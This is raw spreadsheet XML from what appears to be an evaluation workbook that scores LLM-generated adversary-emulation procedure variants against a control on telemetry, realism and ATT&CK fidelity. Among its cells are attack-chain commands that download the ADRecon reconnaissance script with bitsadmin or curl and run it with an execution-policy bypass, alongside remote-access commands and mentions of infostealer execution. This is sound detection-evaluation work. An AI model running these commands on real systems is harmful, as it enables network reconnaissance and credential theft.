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fujitsu-my.sharepoint.com/personal/andres_murillo_fujitsu_com/Documents/Desktop/"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="2505" documentId="11_7B4304B7DB537AE48DEAF71D4C4A787E0AE12F60" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{1E5061C3-6DAD-4232-A023-488CB79C6E83}"/>
  <bookViews>
    <workbookView xWindow="-108" yWindow="-108" windowWidth="23256" windowHeight="12456" firstSheet="3" activeTab="4" xr2:uid="{00000000-000D-0000-FFFF-FFFF00000000}"/>
  </bookViews>
  <sheets>
    <sheet name="FinalScoringQuestionList" sheetId="9" r:id="rId1"/>
    <sheet name="FinalManualQuestionnaire" sheetId="11" r:id="rId2"/>
    <sheet name="AggregatedManualEval" sheetId="13" r:id="rId3"/>
    <sheet name="Manual Questionnaire Template" sheetId="3" r:id="rId4"/>
    <sheet name="Manual Questionnaire 5" sheetId="14" r:id="rId5"/>
    <sheet name="Manual Questionnaire 1" sheetId="5" r:id="rId6"/>
    <sheet name="Manual Questionnaire 2" sheetId="6" r:id="rId7"/>
    <sheet name="Manual Questionnaire 3" sheetId="7" r:id="rId8"/>
    <sheet name="Manual Questionnaire 4"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13" l="1"/>
  <c r="J9" i="13"/>
  <c r="J8" i="13"/>
  <c r="J7" i="13"/>
  <c r="J6" i="13"/>
  <c r="J5" i="13"/>
  <c r="J4" i="13"/>
  <c r="J3" i="13"/>
  <c r="J2" i="13"/>
  <c r="J13" i="13" s="1" a="1"/>
  <c r="J13" i="13" s="1"/>
  <c r="H2" i="13"/>
  <c r="J19" i="13" l="1"/>
  <c r="J14" i="13" a="1"/>
  <c r="J14" i="13" s="1"/>
  <c r="J12" i="13"/>
  <c r="J20" i="13" s="1"/>
  <c r="I10" i="13"/>
  <c r="I9" i="13"/>
  <c r="I8" i="13"/>
  <c r="H10" i="13"/>
  <c r="H9" i="13"/>
  <c r="H8" i="13"/>
  <c r="G10" i="13"/>
  <c r="G9" i="13"/>
  <c r="G8" i="13"/>
  <c r="F10" i="13"/>
  <c r="F9" i="13"/>
  <c r="F8" i="13"/>
  <c r="J16" i="13" l="1"/>
  <c r="J18" i="13"/>
  <c r="M10" i="13"/>
  <c r="Q10" i="13" s="1"/>
  <c r="M9" i="13"/>
  <c r="Q9" i="13" s="1"/>
  <c r="M8" i="13"/>
  <c r="Q8" i="13" s="1"/>
  <c r="L8" i="13" a="1"/>
  <c r="L8" i="13" s="1"/>
  <c r="L9" i="13" a="1"/>
  <c r="L9" i="13" s="1"/>
  <c r="L10" i="13" a="1"/>
  <c r="L10" i="13" s="1"/>
  <c r="N10" i="13"/>
  <c r="N8" i="13"/>
  <c r="N9" i="13"/>
  <c r="K8" i="13" a="1"/>
  <c r="K8" i="13" s="1"/>
  <c r="K9" i="13" a="1"/>
  <c r="K9" i="13" s="1"/>
  <c r="K10" i="13" a="1"/>
  <c r="K10" i="13" s="1"/>
  <c r="J17" i="13"/>
  <c r="I4" i="13"/>
  <c r="I5" i="13"/>
  <c r="I6" i="13"/>
  <c r="I7" i="13"/>
  <c r="H5" i="13"/>
  <c r="H6" i="13"/>
  <c r="H7" i="13"/>
  <c r="G5" i="13"/>
  <c r="G6" i="13"/>
  <c r="G7" i="13"/>
  <c r="F7" i="13"/>
  <c r="F6" i="13"/>
  <c r="F5" i="13"/>
  <c r="I2" i="13"/>
  <c r="I3" i="13"/>
  <c r="H4" i="13"/>
  <c r="F4" i="13"/>
  <c r="G2" i="13"/>
  <c r="G3" i="13"/>
  <c r="G4" i="13"/>
  <c r="H3" i="13"/>
  <c r="F3" i="13"/>
  <c r="F2" i="13"/>
  <c r="F14" i="13" l="1" a="1"/>
  <c r="F14" i="13" s="1"/>
  <c r="F13" i="13" a="1"/>
  <c r="F13" i="13" s="1"/>
  <c r="I13" i="13" a="1"/>
  <c r="I13" i="13" s="1"/>
  <c r="G13" i="13" a="1"/>
  <c r="G13" i="13" s="1"/>
  <c r="H13" i="13" a="1"/>
  <c r="H13" i="13" s="1"/>
  <c r="M2" i="13"/>
  <c r="Q2" i="13" s="1"/>
  <c r="M5" i="13"/>
  <c r="Q5" i="13" s="1"/>
  <c r="M3" i="13"/>
  <c r="Q3" i="13" s="1"/>
  <c r="M6" i="13"/>
  <c r="Q6" i="13" s="1"/>
  <c r="M4" i="13"/>
  <c r="Q4" i="13" s="1"/>
  <c r="M7" i="13"/>
  <c r="Q7" i="13" s="1"/>
  <c r="P8" i="13"/>
  <c r="P9" i="13"/>
  <c r="P10" i="13"/>
  <c r="L3" i="13" a="1"/>
  <c r="L3" i="13" s="1"/>
  <c r="L4" i="13" a="1"/>
  <c r="L4" i="13" s="1"/>
  <c r="L2" i="13" a="1"/>
  <c r="L2" i="13" s="1"/>
  <c r="K2" i="13" a="1"/>
  <c r="K2" i="13" s="1"/>
  <c r="N5" i="13"/>
  <c r="L5" i="13" a="1"/>
  <c r="L5" i="13" s="1"/>
  <c r="L6" i="13" a="1"/>
  <c r="L6" i="13" s="1"/>
  <c r="H12" i="13"/>
  <c r="L7" i="13" a="1"/>
  <c r="L7" i="13" s="1"/>
  <c r="I12" i="13"/>
  <c r="I20" i="13" s="1"/>
  <c r="K6" i="13" a="1"/>
  <c r="K6" i="13" s="1"/>
  <c r="N3" i="13"/>
  <c r="N6" i="13"/>
  <c r="F12" i="13"/>
  <c r="F20" i="13" s="1"/>
  <c r="N2" i="13"/>
  <c r="N7" i="13"/>
  <c r="G12" i="13"/>
  <c r="G20" i="13" s="1"/>
  <c r="N4" i="13"/>
  <c r="K5" i="13" a="1"/>
  <c r="K5" i="13" s="1"/>
  <c r="O10" i="13"/>
  <c r="K4" i="13" a="1"/>
  <c r="K4" i="13" s="1"/>
  <c r="K3" i="13" a="1"/>
  <c r="K3" i="13" s="1"/>
  <c r="K7" i="13" a="1"/>
  <c r="K7" i="13" s="1"/>
  <c r="I14" i="13" a="1"/>
  <c r="I14" i="13" s="1"/>
  <c r="G14" i="13" a="1"/>
  <c r="G14" i="13" s="1"/>
  <c r="G17" i="13" s="1"/>
  <c r="O9" i="13"/>
  <c r="O8" i="13"/>
  <c r="F2" i="9"/>
  <c r="F3" i="9"/>
  <c r="F4" i="9"/>
  <c r="F5" i="9"/>
  <c r="F6" i="9"/>
  <c r="F7" i="9"/>
  <c r="F8" i="9"/>
  <c r="F9" i="9"/>
  <c r="F10" i="9"/>
  <c r="F11"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H18" i="13" l="1"/>
  <c r="H19" i="13"/>
  <c r="G18" i="13"/>
  <c r="G19" i="13"/>
  <c r="I18" i="13"/>
  <c r="I19" i="13"/>
  <c r="F18" i="13"/>
  <c r="F19" i="13"/>
  <c r="F25" i="13"/>
  <c r="P4" i="13"/>
  <c r="P7" i="13"/>
  <c r="P3" i="13"/>
  <c r="P5" i="13"/>
  <c r="P6" i="13"/>
  <c r="P2" i="13"/>
  <c r="I16" i="13"/>
  <c r="I17" i="13"/>
  <c r="F16" i="13"/>
  <c r="F17" i="13"/>
  <c r="O7" i="13"/>
  <c r="G16" i="13"/>
  <c r="O4" i="13"/>
  <c r="O5" i="13"/>
  <c r="O6" i="13"/>
  <c r="O3" i="13"/>
  <c r="H14" i="13" a="1"/>
  <c r="H14" i="13" s="1"/>
  <c r="H20" i="13"/>
  <c r="F24" i="13" l="1"/>
  <c r="O2" i="13"/>
  <c r="F23" i="13" s="1"/>
  <c r="H16" i="13"/>
  <c r="H17" i="13"/>
  <c r="F22" i="1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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="950" uniqueCount="328">
  <si>
    <t>Scoring Category</t>
  </si>
  <si>
    <t>ID</t>
  </si>
  <si>
    <t>Evaluation Question</t>
  </si>
  <si>
    <t>Column1</t>
  </si>
  <si>
    <t>Behavior Chain Fidelity</t>
  </si>
  <si>
    <t>Are any steps in the control missing in the variant? (No = pass)</t>
  </si>
  <si>
    <t>Yes</t>
  </si>
  <si>
    <t>Are any new steps present in the variant that are not in the control? (No = pass)</t>
  </si>
  <si>
    <t>Defensive Value</t>
  </si>
  <si>
    <t>Does the output generate telemetry that can be used for detection?</t>
  </si>
  <si>
    <t>Technical Realism</t>
  </si>
  <si>
    <t>Does the procedure avoid Windows-only constructs on non-Windows systems?</t>
  </si>
  <si>
    <t>Telemetry Equivalence</t>
  </si>
  <si>
    <t>Does the variant generate the same telemetry classes as the control?</t>
  </si>
  <si>
    <t>Telemetry Richness &amp; Differentiation</t>
  </si>
  <si>
    <t>Does execution generate telemetry in more than one telemetry class?</t>
  </si>
  <si>
    <t>3.2.10</t>
  </si>
  <si>
    <t>Are additional telemetry classes present in the variant?</t>
  </si>
  <si>
    <t>3.2.12</t>
  </si>
  <si>
    <t>Does the LLM output explicitly justify missing telemetry?</t>
  </si>
  <si>
    <t>3.2.13</t>
  </si>
  <si>
    <t>Does the LLM output explicitly justify additional telemetry?</t>
  </si>
  <si>
    <t>3.2.2</t>
  </si>
  <si>
    <t>Are different stages observable via different telemetry classes?</t>
  </si>
  <si>
    <t>1. Extract telemetry_classes from each step.
2. Do any 2 consecutive teps have the same telemetry class?</t>
  </si>
  <si>
    <t>Does the telemetry provide the same level of diversity as the control?</t>
  </si>
  <si>
    <t>Does the telemetry include all telemetry classes present in the control?</t>
  </si>
  <si>
    <t>Does the output enable evaluation of detection coverage?</t>
  </si>
  <si>
    <t>No</t>
  </si>
  <si>
    <t>3.0.5</t>
  </si>
  <si>
    <t>Does the output surface defender-relevant artifacts?</t>
  </si>
  <si>
    <t>Do all steps reference real, identifiable commands or tools available on the target platform?</t>
  </si>
  <si>
    <t>1. List all commands/tools referenced in each step.
2. Look up each one; does it exist on the target platform?</t>
  </si>
  <si>
    <t>Are all command arguments, flags, and options valid for the referenced tool and execution context?</t>
  </si>
  <si>
    <t>Does the procedure respect OS-specific constraints and permissions?</t>
  </si>
  <si>
    <t xml:space="preserve"> Procedure JSON: procedure.step.os, procedure.step.command; ATT&amp;CK STIX (coarse): attack-pattern.x_mitre_permissions_required[] (technique-level only)</t>
  </si>
  <si>
    <t>3.1.4</t>
  </si>
  <si>
    <t>Is there a functionally equivalent telemetry source on the variant OS for each source in the control?</t>
  </si>
  <si>
    <t>Does execution of the variant emit events into those sources?</t>
  </si>
  <si>
    <t>3.1.6</t>
  </si>
  <si>
    <t>Would a detection written for the control have a logically equivalent form on the variant?</t>
  </si>
  <si>
    <t>1. Evaluate the detection in question, distilling its core actions (i.e. rule to block http connections to an arbitrary IP)
2. Using the vernacular of the variant OS, look for a detection on the target platform to achieve that same core action</t>
  </si>
  <si>
    <t>3.1.7</t>
  </si>
  <si>
    <t>Would that detection have an opportunity to fire on the variant’s telemetry?</t>
  </si>
  <si>
    <t>Are the telemetry sources appropriate for the observed behavior?</t>
  </si>
  <si>
    <t>Is the telemetry sufficient to evaluate detection coverage, not just confirm execution?</t>
  </si>
  <si>
    <t>Does the variant preserve the same ordered sequence of high-level steps as the control?</t>
  </si>
  <si>
    <t>Does the variant preserve the same logical dependencies between steps?</t>
  </si>
  <si>
    <t>Does the variant preserve the same operator intent per step?</t>
  </si>
  <si>
    <t>Does the variant preserve the same start and end conditions as the control?</t>
  </si>
  <si>
    <t>1. Determine start and end conditions in this and the control scenario.
2. Are they the same?</t>
  </si>
  <si>
    <t>Does the variant preserve the same privilege context progression as the control?</t>
  </si>
  <si>
    <t>1. Determine privilege context of each step in this and the control scenario.
2. Collapse steps with the same context.
3. Compare to control scenario.
4. Is the collapsed list the same as the control scenario's?</t>
  </si>
  <si>
    <t>Does the output help distinguish this behavior from benign activity?</t>
  </si>
  <si>
    <t>Does the output help distinguish this behavior from other adversaries?</t>
  </si>
  <si>
    <t>Does the output avoid producing misleading or confusing telemetry?</t>
  </si>
  <si>
    <t>Are privilege requirements stated or implied correctly?</t>
  </si>
  <si>
    <t>Would this procedure execute successfully in a default environment?</t>
  </si>
  <si>
    <t>3.1.8</t>
  </si>
  <si>
    <t>Does the variant preserve the semantic meaning of what the detection observes?</t>
  </si>
  <si>
    <t>3.2.11</t>
  </si>
  <si>
    <t>If additional telemetry exists, does it improve detection capability?</t>
  </si>
  <si>
    <t>Are any telemetry sources clearly incidental or unrelated? (No = pass)</t>
  </si>
  <si>
    <t>Do multiple telemetry signals reinforce the same behavioral interpretation?</t>
  </si>
  <si>
    <t>1. Extract technique_id from each control step.
2. Validate each technique_id exists in ATT&amp;CK STIX external_id.
3. Build control_step_set = set(canonical_step_id).
4. Extract technique_id from each variant step.
5. Build variant_step_set.
6. Does the control technique_id and canonical_step_id for all the steps align with the variant technique_id and canonical_step_id?</t>
  </si>
  <si>
    <t>Questionnaire</t>
  </si>
  <si>
    <t>1. Extract all commands and tools from each from each variant step into variant_tools.
2. Build variant_arguments by pulling the arguments/flags/options from each tool/command from the variant.
3. Validate each variant tool exists from an Online Tool Search.
4. Are the commands and arguments for the variant valid for the tool and the OS?</t>
  </si>
  <si>
    <t>1. Identify what privilege is specified or required for each variant step.
2. Extract the technique_id from each variant step.
3. Identify what privilege is required for the technique_id from ATT&amp;CK TTPs. *may also explore the tool itself
4. Does the variant_privilege match the technique_privilege?</t>
  </si>
  <si>
    <t>Evaluator Determination</t>
  </si>
  <si>
    <t>Authoritative Data Sources (Scoring Aid)</t>
  </si>
  <si>
    <t>Do the variant and control map to the same parent ATT&amp;CK technique IDs?</t>
  </si>
  <si>
    <t>Do the variant and control map to the same ATT&amp;CK sub-technique IDs (Exact)?</t>
  </si>
  <si>
    <t xml:space="preserve">1. Extract the logical_dependencies from each control step. (This may be which machine are commands being run on, any accesses required, files created, etc.).
2. Extract the logical_dependencies from each variant step.
3. Does the control_logical_dependencies match/align with the variant_logical_dependencies? </t>
  </si>
  <si>
    <t>MITRE ATT&amp;CK STIX: attack-pattern.external_references[].external_id</t>
  </si>
  <si>
    <t>(ONLY if you accept technique-level permission modeling) 1. For each technique_id, look up x_mitre_permissions_required[] in ATT&amp;CK attack-pattern.
2. Derive implied_privilege from command markers you already encode structurally (e.g., a parsed boolean requires_elevation extracted from sudo, service-control APIs, etc.).
3. Compare required vs implied at the technique level.</t>
  </si>
  <si>
    <t>1. For each step:
2. Identify the OS of the system used in this step.
3. If non-Windows, check step procedure against list of known Windows-only elements.
4. Did any step using a non-Windows platform contain a known Windows-only element?</t>
  </si>
  <si>
    <t>Evaluation Steps (Scoring Aid)</t>
  </si>
  <si>
    <t xml:space="preserve">1. 
2. 
3. 
4. 
5. 
6. </t>
  </si>
  <si>
    <t>Notes/Comments On Scoring</t>
  </si>
  <si>
    <t>Notes/Comments on Question</t>
  </si>
  <si>
    <t>Manual understanding of start and end conditions</t>
  </si>
  <si>
    <t>Plan level; (want to consider what can be plan-based). Can possibly be automated considering the order + parent_technique_ids, or looking at the tactic level.</t>
  </si>
  <si>
    <t>step level;</t>
  </si>
  <si>
    <t>plan level;</t>
  </si>
  <si>
    <t>plan level; possibly needs to be done with the ability to measure/simulate the execution environment and verify the states.</t>
  </si>
  <si>
    <t>not looking at correctness, just looking at "why" we are doing something versus "what" we are doing. Want to look at the "description" field to understand intent.</t>
  </si>
  <si>
    <t>step level; greying out bc want to look at the "intent" the LLM had via description field, reasoning</t>
  </si>
  <si>
    <t>step level; previously eliminated question 2.6 "would this successfully execute in a default environment?"</t>
  </si>
  <si>
    <t>plan level, can possibly be automated with the "execution_level" argument.</t>
  </si>
  <si>
    <t>step 5 should be "elevated" in variant. Want to confirm the "execution_level" argument as directly input by the LLM, or derived.</t>
  </si>
  <si>
    <t>Step 4 acts like user is on the SQL host, vs downloading to the SQL host remotely using bitsasmin (not logically on that host yet). Step 6 claiming that user is SSH'd on Windows datamon_server (SQL server), yet using a linux command. Step 7 also looking to execute a command on the sql_server which shoult be windows, and was previously named called datamon_server (not keeping naming consistent).</t>
  </si>
  <si>
    <t>step level; keep in context of what the step is and what the OS is that the LLM procedure claims to be working on</t>
  </si>
  <si>
    <t xml:space="preserve">TRUE for tool context alone. For execution context, Step 4, step 6, step 7 claims to be working on Windiws but uses Linux command version (curl, wine) </t>
  </si>
  <si>
    <t>see above</t>
  </si>
  <si>
    <t>This is technically true for this case, but the LLM overvorrected to translate where it didn't need to/still claimed it was executing in a windows context. Also, technically relied on pwsh and wine to execute Windows concepts (.ps1) on Linux (Step 3).</t>
  </si>
  <si>
    <t>D3FEND observables are produced for all activity.</t>
  </si>
  <si>
    <t>Not sure we ask for the LLM to justify telemetry. Current "notes" justification is just for the conversion. Possibly grey out.</t>
  </si>
  <si>
    <t>"wine" is not default on Linux systems generally, it might need to be installed. Using "pwsh" on Linux is also not truly translating the intent as much as creating an accurate alternative. May need to confirm that SSH is available to access Windows machines. LLM does justify in "warnings"</t>
  </si>
  <si>
    <t>step level; Can possibly be automated connecting TTP to known ATT&amp;CK privilege levels. Don't think elevated/non-elevated is specific enough.</t>
  </si>
  <si>
    <t>Step 5 Lateral Movement is not elevated in the variant</t>
  </si>
  <si>
    <t xml:space="preserve">Step 5 Lateral Movement in the control may not _require_ elevated privileges to execute </t>
  </si>
  <si>
    <t>Step 5 Lateral Movement in the control may not _require_ elevated privileges to execute</t>
  </si>
  <si>
    <t>non-elevated for all steps. (need to dig deeper to ATT&amp;CK validation)</t>
  </si>
  <si>
    <t>high-level steps should probably correspond with tactic instead of technique</t>
  </si>
  <si>
    <t>Looked at telemetry classes for each step</t>
  </si>
  <si>
    <t>Step 1-2: network, process; Step 2-4: file, network, process; Step 4-6: network, process; Step 6-7: file, process. Process is through all.</t>
  </si>
  <si>
    <t>step level; can be better evaluated w/current strategy using telemetry classes alone. Eliminate for now.</t>
  </si>
  <si>
    <t>TRUE-ish</t>
  </si>
  <si>
    <t>haven't validated linux detections but core actions-wise it should be possible to limit downloads of known malicious or harmful tools and log remote accesses</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">All 7 steps have some combination of file, network, identity, and process but no two consecutive steps have the </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>exact</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> same combo *Process is consistent across all 7 steps</t>
    </r>
  </si>
  <si>
    <t>this is very similar to the intent and start/end conditions questions</t>
  </si>
  <si>
    <t>aside from some windows machines in the variant and some potential tools that may be mismatched for the OS the dependencies seem to align across the steps from the control to the variant</t>
  </si>
  <si>
    <t>haven't validated but I think the arguments all apply to their respective tool</t>
  </si>
  <si>
    <t>Possible to exist but needed to be downloaded independently: pwsh on linux, curl on windows, wine on windows</t>
  </si>
  <si>
    <t>step level; eliminated for same reason as others asking "does this generate telemetry at all"</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Control/Variant JSON: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>procedure.action_sequence[].technique_id</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>original_step_id</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">1) Extract ordered </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>technique_id</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> list from control. 
2) Extract ordered </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>technique_id</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> list from variant (or order by </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>original_step_id</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>). 
3) Compare sequences for exact match.</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Variant keeps 7 steps with matching </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>original_step_id</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> and technique IDs; evaluation shows </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>technique_ids_match: passed</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>.</t>
    </r>
  </si>
  <si>
    <t>Step #</t>
  </si>
  <si>
    <t>Control Technique</t>
  </si>
  <si>
    <t>Control Command</t>
  </si>
  <si>
    <t>Variant Technique</t>
  </si>
  <si>
    <t>Variant Command</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Control/Variant JSON: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>host</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>os</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>command</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>description</t>
    </r>
  </si>
  <si>
    <t>1) For each step, derive dependencies: access path (remote service), where artifacts land (download paths), which host executes which tool, and prerequisites (e.g., tool present before execution). 
2) Compare control vs variant per step. 
3) Fail if execution host/target relationships materially change.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Material dependency shift: in control the InfoStealer execution is on </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>datamon</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">; in variant it is executed on </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>sql_server</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> via </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>wine</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> and tool placement paths differ, changing which host must satisfy prerequisites.</t>
    </r>
  </si>
  <si>
    <t>T1133</t>
  </si>
  <si>
    <t>mstsc /v:10.20.20.11</t>
  </si>
  <si>
    <t>ssh contractor@10.20.20.11</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Control/Variant JSON: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>tactic</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>technique_id</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>description</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">1) For each step, summarize intent from tactic/technique/description (e.g., remote access, tool transfer, discovery, credential access). 
2) Align by </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>original_step_id</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>. 
3) Pass if intent matches even if implementation differs.</t>
    </r>
  </si>
  <si>
    <t>T1105</t>
  </si>
  <si>
    <t>bitsadmin /transfer adrecon /download https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1 C:\Users\Public\ADRecon.ps1</t>
  </si>
  <si>
    <t>curl -L https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1 -o "$HOME/Downloads/ADRecon.ps1"</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Control/Variant JSON: step 1 + last step </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>description</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>, plus narrative across steps</t>
    </r>
  </si>
  <si>
    <t>1) Identify start condition (stolen creds enabling initial remote access). 
2) Identify end condition (credential harvesting/extraction outcome). 
3) Compare.</t>
  </si>
  <si>
    <t>T1087.002</t>
  </si>
  <si>
    <t>powershell -ExecutionPolicy Bypass -Scope CurrentUser -File C:\Users\Public\ADRecon.ps1</t>
  </si>
  <si>
    <t>pwsh -ExecutionPolicy Bypass -File "$HOME/Downloads/ADRecon.ps1"</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Control/Variant JSON: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>execution_level</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> per step</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">1) Extract </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>execution_level</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> sequence for control. 
2) Extract </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>execution_level</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> sequence for variant. 
3) Compare transitions (non-elev → elevated → non-elev, etc.).</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Control includes an </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>elevated</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
